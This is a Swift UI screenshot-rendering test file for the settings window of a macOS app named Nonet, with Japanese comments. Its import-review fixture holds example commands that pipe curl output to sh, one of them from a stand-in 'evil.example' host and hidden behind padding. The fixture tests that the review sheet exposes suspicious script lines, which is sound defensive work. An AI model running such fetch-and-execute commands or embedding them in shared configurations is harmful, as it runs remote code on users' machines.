// 担当: ui-settings
// 見た目の確認用に、画面を PNG に描き出す。NONET_RENDER_SHOTS=<フォルダ> のときだけ動く
//   NONET_RENDER_SHOTS=/tmp/nonet-ui-settings-shots swift test --filter SettingsRenderShots
import AppKit
import NonetCore
@testable import NonetUI
import SwiftUI
import Testing

private let shotsDirectory = ProcessInfo.processInfo.environment["NONET_RENDER_SHOTS"]

@Suite(.enabled(if: shotsDirectory != nil), .serialized)
@MainActor
struct SettingsRenderShots {
    private let appearances: [(String, NSAppearance.Name)] = [("light", .aqua), ("dark", .darkAqua)]

    private var directory: URL {
        URL(fileURLWithPath: shotsDirectory ?? NSTemporaryDirectory(), isDirectory: true)
    }

    /// 長い名前や空きマスを含む、見本の設定
    private static func sampleConfiguration() -> NonetConfiguration {
        var configuration = SettingsFixtures.configuration()
        let longApp = AppReference(bundleID: "com.example.long", name: "とても長い名前のアプリケーション プロフェッショナル版")
        let longID = configuration.addAppProfile(for: longApp, preset: nil)
        configuration.setCell(Cell(
            title: "選択範囲をフレームで囲んで自動レイアウトを追加する",
            icon: .symbol("rectangle.3.group"),
            action: .keystroke(.sequence(.key("g", [.option, .command]), .key("a", .shift), .key("k", [.option, .command])))
        ), at: CellAddress(page: 0, index: 0), profileID: longID)
        configuration.setCell(Cell(title: "", icon: .symbol("link"), action: .openURL(URLAction(url: "exa mple"))),
                              at: CellAddress(page: 0, index: 4), profileID: longID)
        configuration.setCell(Cell(title: "要約", icon: .text("要"), action: .ai(AIAction(prompt: "3行で要約して", output: .showResult))),
                              at: CellAddress(page: 0, index: 8), profileID: longID)
        configuration.addAppProfile(for: SettingsFixtures.figma, preset: PresetLibrary.preset(forBundleID: SettingsFixtures.figma.bundleID))
        return configuration.validated()
    }

    private func harness() throws -> SettingsHarness {
        _ = NSApplication.shared
        let h = try SettingsHarness(
            configuration: Self.sampleConfiguration(),
            isJISKeyboard: true,
            links: AppLinks(
                purchase: URL(string: "https://example.com/buy"),
                support: URL(string: "https://example.com/guide"),
                privacy: URL(string: "https://example.com/privacy")
            )
        )
        h.menus.apps = [SettingsMenuSamples.figma, SettingsMenuSamples.notes]
        h.menus.items = SettingsMenuSamples.figmaMenus
        h.shortcuts.names = ["マイクを切り替える", "ページを要約", "翻訳"]
        h.ai.unavailableReason = "Apple Intelligence がオフになっています。システム設定 › Apple Intelligence と Siri でオンにしてください"
        return h
    }

    private func profile(named name: String, in h: SettingsHarness) throws -> Profile {
        try #require(h.controller.configuration.profiles.first { $0.name.hasPrefix(name) })
    }

    @Test func renderAll() async throws {
        try FileManager.default.createDirectory(at: directory, withIntermediateDirectories: true)
        for (suffix, appearance) in appearances {
            let h = try harness()
            let model = h.model

            // プロファイル: Xcode の中央（Claude Code のスクリプト）
            model.selectProfile(try profile(named: "Xcode", in: h).id)
            model.selectCell(4)
            try await render(SettingsRootView(model: model), size: CGSize(width: 1120, height: 720), appearance, "profiles-script-\(suffix)")

            // 最小の大きさ・キー入力のマス
            model.selectCell(0)
            try await render(SettingsRootView(model: model), size: CGSize(width: 860, height: 560), appearance, "profiles-min-keystroke-\(suffix)")

            // マスを空にした後の「元に戻す」（最小の大きさ）
            model.clearCell(at: 1)
            try await render(SettingsRootView(model: model), size: CGSize(width: 860, height: 560), appearance, "profiles-min-undo-\(suffix)")
            model.undoFromNotice()
            model.selectCell(0)

            // 記録中
            let cellID = try #require(model.selectedCell?.id)
            model.beginRecording(cellID: cellID)
            model.handleKeyDown(keyCode: 0x25, characters: "l", flags: .command)
            model.handleFlagsChanged([.command, .shift])
            try await render(SettingsInspectorView(model: model), size: CGSize(width: 310, height: 520), appearance, "inspector-recording-\(suffix)")
            model.cancelRecording()

            // 長い名前のプロファイル・空きマス・URL の誤り
            model.selectProfile(try profile(named: "とても長い", in: h).id)
            model.selectCell(4)
            try await render(SettingsRootView(model: model), size: CGSize(width: 1120, height: 720), appearance, "profiles-long-url-\(suffix)")
            // 最小の大きさで3ページ（ページの見出しが入りきること）
            model.addPage()
            model.addPage()
            model.selectPage(0)
            model.selectCell(4)
            try await render(SettingsRootView(model: model), size: CGSize(width: 860, height: 560), appearance, "profiles-min-3pages-\(suffix)")
            try await render(SettingsRootView(model: model), size: CGSize(width: 980, height: 600), appearance, "profiles-980-3pages-\(suffix)")
            model.selectCell(1)
            try await render(SettingsInspectorView(model: model), size: CGSize(width: 310, height: 520), appearance, "inspector-empty-\(suffix)")
            model.selectCell(8)
            try await render(SettingsInspectorView(model: model), size: CGSize(width: 310, height: 620), appearance, "inspector-ai-\(suffix)")

            // グローバル・アプリ起動・無効のプロファイル（Safari）
            model.selectProfile(nil)
            model.selectCell(0)
            try await render(SettingsInspectorView(model: model), size: CGSize(width: 310, height: 560), appearance, "inspector-launch-\(suffix)")
            model.selectProfile(try profile(named: "Safari", in: h).id)
            try await render(SettingsRootView(model: model), size: CGSize(width: 1120, height: 720), appearance, "profiles-disabled-\(suffix)")
            // このアプリでは Nonet を使わない（最小の大きさでも見出しが入ること）
            model.setProfileMode(model.selectedProfile.id, .off)
            try await render(SettingsRootView(model: model), size: CGSize(width: 1120, height: 720), appearance, "profiles-turned-off-\(suffix)")
            try await render(SettingsRootView(model: model), size: CGSize(width: 860, height: 560), appearance, "profiles-min-turned-off-\(suffix)")
            model.setProfileMode(model.selectedProfile.id, .global)

            // ページの名前・絞り込み・消した後の「元に戻す」
            let xcodeID = try profile(named: "Xcode", in: h).id
            model.selectProfile(xcodeID)
            model.addPage()
            model.renamePage(0, to: "ビルド")
            model.renamePage(1, to: "デバッグとプロファイル")
            model.selectPage(0)
            model.selectCell(0)
            model.profileQuery = "⌘B"
            try await render(SettingsRootView(model: model), size: CGSize(width: 1120, height: 720), appearance, "profiles-filter-pages-\(suffix)")
            try await render(SettingsRootView(model: model), size: CGSize(width: 860, height: 560), appearance, "profiles-min-filter-pages-\(suffix)")
            model.clearFilter()
            model.removePage(1, profileID: xcodeID)
            try await render(SettingsRootView(model: model), size: CGSize(width: 1120, height: 720), appearance, "profiles-page-deleted-\(suffix)")
            model.undoFromNotice()
            try await render(SettingsPageNameEditor(model: model, index: 1, name: "デバッグ"), size: CGSize(width: 260, height: 190), appearance, "popover-page-name-\(suffix)")

            // ショートカット・メニュー項目
            model.selectProfile(nil)
            model.createCell(kind: .shortcut, at: 1)
            let shortcutID = try #require(model.selectedCell?.id)
            model.replaceAction(ofCell: shortcutID, with: .shortcut(ShortcutAction(name: "無いショートカット", passSelectedText: true)))
            model.shortcutList.loadIfNeeded()
            await model.shortcutList.waitUntilLoaded()
            try await render(SettingsInspectorView(model: model), size: CGSize(width: 310, height: 560), appearance, "inspector-shortcut-\(suffix)")

            // メニューから割り当て
            model.showMenus(true)
            model.menuBrowser.select(SettingsMenuSamples.figma)
            await model.menuBrowser.waitUntilLoaded()
            let node = try #require(model.menuBrowser.sections.dropFirst().first?.entries.dropFirst().first?.node)
            model.assignMenuItem(node, to: CellAddress(page: 0, index: 3))
            try await render(SettingsRootView(model: model), size: CGSize(width: 1120, height: 720), appearance, "profiles-menus-\(suffix)")
            model.showMenus(false)
            try await render(SettingsInspectorView(model: model), size: CGSize(width: 310, height: 520), appearance, "inspector-menuitem-\(suffix)")
            model.menuBrowser.query = "存在しない"
            model.showMenus(true)
            try await render(SettingsMenuPanel(model: model, browser: model.menuBrowser), size: CGSize(width: 310, height: 520), appearance, "menus-noresult-\(suffix)")
            // 読み込みの途中でウィンドウを閉じた
            h.menus.delayByProcess[SettingsMenuSamples.figma.processID] = .seconds(30)
            model.menuBrowser.reload()
            model.menuBrowser.cancel()
            h.menus.delayByProcess[SettingsMenuSamples.figma.processID] = nil
            try await render(SettingsMenuPanel(model: model, browser: model.menuBrowser), size: CGSize(width: 310, height: 520), appearance, "menus-idle-\(suffix)")
            h.menus.error = .permissionDenied("アクセシビリティ")
            model.menuBrowser.reload()
            await model.menuBrowser.waitUntilLoaded()
            try await render(SettingsMenuPanel(model: model, browser: model.menuBrowser), size: CGSize(width: 310, height: 520), appearance, "menus-permission-\(suffix)")
            model.showMenus(false)

            // 一般（JIS で右⌥・ログイン項目の失敗）
            model.selectTab(.general)
            model.setSetting(\.trigger, .rightOption)
            h.loginItem.failure = SettingsFakeLoginError()
            model.setLoginItemEnabled(true)
            try await render(SettingsRootView(model: model), size: CGSize(width: 860, height: 1300), appearance, "general-\(suffix)")

            // ライセンス（試用: 購入が先・キーの欄が空、エラーとお問い合わせ）
            model.supportEmail = "support@example.com"
            model.selectTab(.license)
            try await render(SettingsRootView(model: model), size: CGSize(width: 860, height: 640), appearance, "license-trial-empty-\(suffix)")
            model.licenseKeyInput = "eyJsaWNlbnNlSUQiOiJ.broken"
            model.activateLicense()
            try await render(SettingsRootView(model: model), size: CGSize(width: 860, height: 640), appearance, "license-trial-\(suffix)")
            model.licenseKeyInput = "NONET-2026-000123"
            model.activateLicense()
            try await render(SettingsRootView(model: model), size: CGSize(width: 860, height: 640), appearance, "license-trial-id-\(suffix)")
            model.licenseKeyInput = ""
            model.licenseMessage = nil

            // 情報
            model.selectTab(.about)
            try await render(SettingsRootView(model: model), size: CGSize(width: 860, height: 640), appearance, "about-\(suffix)")

            // 状態の帯（権限なし）と書き出しの結果
            h.permissions.isAccessibilityGranted = false
            h.controller.refreshPermissions()
            model.fileMessage = SettingsMessage(text: "2個のプロファイルを追加しました。\nスクリプトを含むマスがあります。実行する前に中身を確かめてください。", isError: false)
            model.selectTab(.profiles)
            try await render(SettingsRootView(model: model), size: CGSize(width: 1120, height: 760), appearance, "banners-\(suffix)")

            // シートと吹き出しの中身
            model.loadInstalledAppsIfNeeded()
            try await render(SettingsAddProfileSheet(model: model), size: CGSize(width: 460, height: 520), appearance, "sheet-add-profile-\(suffix)")
            model.beginDuplicatingProfile(try profile(named: "Xcode", in: h).id)
            try await render(SettingsAddProfileSheet(model: model), size: CGSize(width: 460, height: 520), appearance, "sheet-duplicate-profile-\(suffix)")
            model.isAddingProfile = false
            model.backupStore?.makeBackup(of: h.controller.configuration, reason: .beforeImport)
            model.showBackups()
            try await render(SettingsBackupsSheet(model: model), size: CGSize(width: 480, height: 420), appearance, "sheet-backups-\(suffix)")
            model.isShowingBackups = false
            try await render(
                SettingsIconPicker(icon: .symbol("hammer"), suggestedAppBundleID: "com.apple.dt.Xcode", defaultIcon: .symbol("keyboard")) { _ in },
                size: CGSize(width: 340, height: 360), appearance, "popover-icons-\(suffix)"
            )
            try await render(SettingsScriptHelp().padding(16).frame(width: 380), size: CGSize(width: 380, height: 480), appearance, "popover-script-help-\(suffix)")
            try await render(
                SettingsAppPickerPopover(model: model, current: "com.apple.Safari") { _ in },
                size: CGSize(width: 320, height: 380), appearance, "popover-apps-\(suffix)"
            )
        }
    }

    @Test func renderLicensedAndExpired() async throws {
        try FileManager.default.createDirectory(at: directory, withIntermediateDirectories: true)
        let pair = LicenseSigner.generateKeyPair()
        let signer = try LicenseSigner(privateKeyBase64: pair.privateKeyBase64)
        let key = try signer.sign(LicenseInfo(licenseID: "NONET-2026-000123", licensee: "山田 太郎", email: "taro.yamada@example.com", issuedAt: Date(timeIntervalSince1970: 1_790_000_000)))
        for (suffix, appearance) in appearances {
            _ = NSApplication.shared
            let h = try SettingsHarness(verifier: try LicenseVerifier(publicKeyBase64: pair.publicKeyBase64), links: AppLinks(purchase: URL(string: "https://example.com/buy")))
            h.model.supportEmail = "support@example.com"
            h.model.copyToPasteboard = { _ in }
            h.model.selectTab(.license)
            h.model.licenseKeyInput = key
            h.model.activateLicense()
            try await render(SettingsRootView(model: h.model), size: CGSize(width: 860, height: 640), appearance, "license-licensed-\(suffix)")
            h.model.copyLicenseKey()
            try await render(SettingsRootView(model: h.model), size: CGSize(width: 860, height: 640), appearance, "license-licensed-copied-\(suffix)")
            h.model.setEnteringAnotherKey(true)
            try await render(SettingsRootView(model: h.model), size: CGSize(width: 860, height: 720), appearance, "license-licensed-another-\(suffix)")
            h.model.setEnteringAnotherKey(false)

            let storage = SettingsFakeLicenseStorage()
            storage.trialStartDate = Date(timeIntervalSinceReferenceDate: 700_000_000)
            let expired = LicenseManager(verifier: nil, storage: storage, now: { Date(timeIntervalSinceReferenceDate: 800_000_000) })
            let model = SettingsModel(controller: h.controller, license: expired, services: h.services, links: AppLinks(purchase: URL(string: "https://example.com/buy")), onCheckForUpdates: {})
            model.supportEmail = "support@example.com"
            model.selectTab(.license)
            try await render(SettingsRootView(model: model), size: CGSize(width: 860, height: 640), appearance, "license-expired-\(suffix)")
            model.selectTab(.about)
            try await render(SettingsRootView(model: model), size: CGSize(width: 860, height: 640), appearance, "about-update-\(suffix)")
            // ほかのタブの上の「試用期間が終了しました」の帯
            model.selectTab(.general)
            try await render(SettingsRootView(model: model), size: CGSize(width: 860, height: 420), appearance, "banners-expired-\(suffix)")
            // 試用期間が終わったときのウィンドウ（購入のページがあるとき・無いとき）
            try await render(TrialEndedView(showsPurchase: true, onBuy: {}, onRegister: {}, onLater: {}), size: CGSize(width: TrialEndedView.width, height: 150), appearance, "trial-ended-\(suffix)")
            try await render(TrialEndedView(showsPurchase: false, onBuy: {}, onRegister: {}, onLater: {}), size: CGSize(width: TrialEndedView.width, height: 150), appearance, "trial-ended-no-purchase-\(suffix)")
            try await render(SettingsAboutView(model: model, showsNotices: true), size: CGSize(width: 860, height: 900), appearance, "about-notices-\(suffix)")
        }
    }

    /// 読み込む前の確認のシート（スクリプトは全部の行、注意が要る行は目立たせる。最後までスクロールするまで「読み込む」は押せない）
    @Test func renderImportReview() async throws {
        try FileManager.default.createDirectory(at: directory, withIntermediateDirectories: true)
        _ = NSApplication.shared
        var shared = SettingsFixtures.configuration()
        let typing = "curl -s https://example.com/install.sh | sh".map { $0 == " " ? KeyChord(.special(.space)) : KeyChord(.character(String($0))) }
        shared.addAppProfile(for: SettingsFixtures.terminal, preset: nil)
        let terminalID = try #require(shared.profiles.first { $0.app == SettingsFixtures.terminal }?.id)
        shared.setCell(SettingsFixtures.key("インストール", KeySequence(typing + [KeyChord(.special(.returnKey))])), at: CellAddress(page: 0, index: 0), profileID: terminalID)
        shared.setCell(Cell(title: "資料", icon: .symbol("doc"), action: .openURL(URLAction(url: "~/Documents/手順.command"))), at: CellAddress(page: 0, index: 1), profileID: terminalID)
        let long = (1...12).map { "echo \"step \($0)\"" }.joined(separator: "\n")
            + "\necho \"Formatting the selection as Markdown \(String(repeating: "x", count: 90))\"; curl -fsSL https://evil.example/p | sh"
        shared.setCell(Cell(title: "長いスクリプト", icon: .symbol("terminal"), action: .script(ScriptAction(source: long))), at: CellAddress(page: 0, index: 2), profileID: terminalID)
        shared.setCell(Cell(title: "コピー", icon: .symbol("doc.on.doc"), action: .menuItem(MenuItemAction(
            app: SettingsFixtures.terminal, path: ["編集", "コピー"], keyEquivalent: .special(.delete, [.option, .shift, .command])
        ))), at: CellAddress(page: 0, index: 3), profileID: terminalID)
        for (suffix, appearance) in appearances {
            let h = try harness()
            let plan = SettingsImportPlan(
                document: ConfigurationStore.ImportedProfiles(profiles: shared.profiles),
                configuration: h.controller.configuration,
                fileName: "shared.nonetprofile"
            )
            try await render(SettingsImportReviewSheet(model: h.model, plan: plan), size: CGSize(width: 640, height: 760), appearance, "sheet-import-review-\(suffix)")
        }
    }

    /// アンインストールの確認と、ゴミ箱に入れた後の知らせ（SwiftUI の alert と同じ NSAlert に、同じ文言を入れて描く）
    @Test func renderUninstallAlerts() async throws {
        try FileManager.default.createDirectory(at: directory, withIntermediateDirectories: true)
        _ = NSApplication.shared
        let leftovers = SettingsUninstallResult(
            leftovers: [URL(fileURLWithPath: NSHomeDirectory()).appending(path: "Library/Caches/com.iam74k4.Nonet")],
            loginItemFailed: true
        )
        let alerts: [(String, String, String, [String])] = [
            ("alert-uninstall-confirm", String(localized: "Nonet をアンインストールしますか？", bundle: .nonetUI), SettingsText.uninstallConfirmation,
             [String(localized: "アンインストール", bundle: .nonetUI), String(localized: "キャンセル", bundle: .nonetUI)]),
            ("alert-uninstall-finished", String(localized: "Nonet をゴミ箱に入れました", bundle: .nonetUI), SettingsText.uninstallFinished(leftovers),
             [String(localized: "システム設定を開いて終了", bundle: .nonetUI)]),
        ]
        for (suffix, appearance) in appearances {
            for (name, title, message, buttons) in alerts {
                let alert = NSAlert()
                alert.messageText = title
                alert.informativeText = message
                for button in buttons {
                    alert.addButton(withTitle: button)
                }
                alert.window.appearance = NSAppearance(named: appearance)
                alert.layout()
                try await settle()
                guard let frameView = alert.window.contentView?.superview else { return }
                frameView.layoutSubtreeIfNeeded()
                try write(frameView, name: "\(name)-\(suffix)")
            }
        }
    }

    /// ツールバーを含むウィンドウ全体（画面には出さない）
    @Test func renderWindowChrome() async throws {
        try FileManager.default.createDirectory(at: directory, withIntermediateDirectories: true)
        for (suffix, appearance) in appearances {
            let h = try harness()
            let controller = SettingsWindowController(controller: h.controller, license: h.license, services: h.services, links: AppLinks(), onCheckForUpdates: nil)
            controller.autosavesFrame = false
            let window = controller.loadWindow()
            window.appearance = NSAppearance(named: appearance)
            controller.select(.profiles)
            controller.model.selectProfile(try profile(named: "Xcode", in: h).id)
            controller.model.selectCell(4)
            try await settle()
            guard let frameView = window.contentView?.superview else { return }
            frameView.layoutSubtreeIfNeeded()
            try write(frameView, name: "window-\(suffix)")
            window.close()
        }
    }

    // MARK: - 描き出し

    private func settle() async throws {
        for _ in 0..<4 {
            try await Task.sleep(for: .milliseconds(80))
        }
    }

    private func render<V: View>(_ view: V, size: CGSize, _ appearance: NSAppearance.Name, _ name: String) async throws {
        let window = NSWindow(
            contentRect: NSRect(origin: .zero, size: size),
            styleMask: [.titled, .resizable],
            backing: .buffered,
            defer: false
        )
        window.isReleasedWhenClosed = false
        window.appearance = NSAppearance(named: appearance)
        let hosting = NSHostingView(rootView: view.frame(width: size.width, height: size.height).background(Color(nsColor: .windowBackgroundColor)))
        hosting.frame = NSRect(origin: .zero, size: size)
        window.contentView = hosting
        hosting.layoutSubtreeIfNeeded()
        try await settle()
        hosting.layoutSubtreeIfNeeded()
        try write(hosting, name: name)
        window.contentView = nil
        window.close()
    }

    private func write(_ view: NSView, name: String) throws {
        guard let representation = view.bitmapImageRepForCachingDisplay(in: view.bounds) else {
            Issue.record("\(name) を描けない")
            return
        }
        view.cacheDisplay(in: view.bounds, to: representation)
        let data = try #require(representation.representation(using: .png, properties: [:]))
        try data.write(to: directory.appending(path: "\(name).png"))
    }
}
